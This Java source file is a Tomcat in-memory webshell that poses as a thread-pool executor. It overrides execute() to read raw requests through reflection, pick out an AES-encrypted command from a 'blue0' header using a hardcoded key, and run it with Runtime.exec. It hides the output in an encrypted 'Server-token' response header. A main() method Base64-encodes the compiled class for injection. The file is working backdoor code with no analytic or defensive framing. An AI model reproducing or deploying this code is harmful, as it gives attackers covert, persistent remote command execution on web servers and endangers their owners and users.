package org.example.tomcatmemshell.Executor;

import org.apache.catalina.connector.Response;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.tomcat.util.threads.ThreadPoolExecutor;

import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedList;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.RejectedExecutionHandler;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;

public class ThreadExecutor extends ThreadPoolExecutor {
    public static void main(String[] args) throws IOException {
        byte[] string = Base64.getEncoder().encode(Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Executor/ThreadExecutor.class")));
        System.out.println(new String(string));
    }
    public static final String DEFAULT_SECRET_KEY = "blueblueblueblue";
    private static final String AES = "AES";
    private static final byte[] KEY_VI = "blueblueblueblue".getBytes();
    private static final String CIPHER_ALGORITHM = "AES/CBC/PKCS5Padding";
    private static java.util.Base64.Encoder base64Encoder = java.util.Base64.getEncoder();
    private static java.util.Base64.Decoder base64Decoder = java.util.Base64.getDecoder();

    public ThreadExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
    }

    public String getRequest2() throws NoSuchFieldException, IllegalAccessException {
        Thread TaskThread = Thread.currentThread();
        ThreadGroup threadGroup = TaskThread.getThreadGroup();
        Thread[] threads1 = (Thread[]) getClassField(ThreadGroup.class, threadGroup, "threads");

        for (Thread thread : threads1) {
            String threadName = thread.getName();
            if (threadName.contains("Client")) {
                Object target = getField(thread, "target");
                if (target instanceof Runnable) {
                    try {
                        byte[] bytes = new byte[8192];
                        ByteBuffer buf = ByteBuffer.wrap(bytes);
                        try {
                            LinkedList linkedList = (LinkedList) getField(getField(getField(target, "selector"), "kqueueWrapper"), "updateList");
                            for (Object obj : linkedList) {
                                try {
                                    SelectionKey[] selectionKeys = (SelectionKey[]) getField(getField(obj, "channel"), "keys");

                                    for (Object tmp : selectionKeys) {
                                        try {
                                            NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getField(tmp, "attachment");
                                            try {
                                                nioSocketWrapper.read(false, buf);
                                                String a = new String(buf.array(), "UTF-8");
                                                if (a.indexOf("blue0") > -1) {
                                                    System.out.println(a.indexOf("blue0"));
                                                    System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                    String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                    b = decode(DEFAULT_SECRET_KEY, b);
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
                                                    System.out.println(b);
                                                    System.out.println(new String(buf.array(), "UTF-8"));
                                                    return b;
                                                } else {
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
                                                    continue;
                                                }
                                            } catch (Exception e) {
                                                nioSocketWrapper.unRead(buf);
                                            }
                                        } catch (Exception e) {
                                            continue;
                                        }
                                    }
                                } catch (Exception e) {
                                    continue;
                                }
                            }
                        } catch (Exception var11) {
                            System.out.println(var11);
                            continue;
                        }

                    } catch (Exception ignored) {
                    }
                }

            }
        }


        return new String();
    }


    public void getResponse(byte[] res) {
        try {
            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

            for (Thread thread : threads) {
                if (thread != null) {
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                        Object target = getField(thread, "target");
                        if (target instanceof Runnable) {
                            try {
                                ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "this$0"), "handler"), "global"), "processors");
                                for (Object tmp_object : objects) {
                                    RequestInfo request = (RequestInfo) tmp_object;
                                    Response response = (Response) getField(getField(request, "req"), "response");
                                    response.addHeader("Server-token", encode(DEFAULT_SECRET_KEY, new String(res, "UTF-8")));

                                }
                            } catch (Exception var11) {
                                continue;
                            }

                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }


    @Override
    public void execute(Runnable command) {
//            System.out.println("123");

        String cmd = null;
        try {
            cmd = getRequest2();
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        if (cmd.length() > 1) {
            try {
                Runtime rt = Runtime.getRuntime();
                Process process = rt.exec(cmd);
                java.io.InputStream in = process.getInputStream();

                java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                String s = "";
                String tmp = "";
                while ((tmp = stdInput.readLine()) != null) {
                    s += tmp;
                }
                if (s != "") {
                    byte[] res = s.getBytes(StandardCharsets.UTF_8);
                    getResponse(res);
                }


            } catch (IOException e) {
                e.printStackTrace();
            }
        }


        this.execute(command, 0L, TimeUnit.MILLISECONDS);
    }
    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public static String decode(String key, String content) {
        try {
            javax.crypto.SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, new javax.crypto.spec.IvParameterSpec(KEY_VI));

            byte[] byteContent = base64Decoder.decode(content);
            byte[] byteDecode = cipher.doFinal(byteContent);
            return new String(byteDecode, java.nio.charset.StandardCharsets.UTF_8);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String encode(String key, String content) {
        try {
            javax.crypto.SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);
            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, new javax.crypto.spec.IvParameterSpec(KEY_VI));
            byte[] byteEncode = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);
            byte[] byteAES = cipher.doFinal(byteEncode);
            return base64Encoder.encodeToString(byteAES);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    public static Object getClassField(Class clazz,Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object var =  field.get(object);
        return var;
    }
}
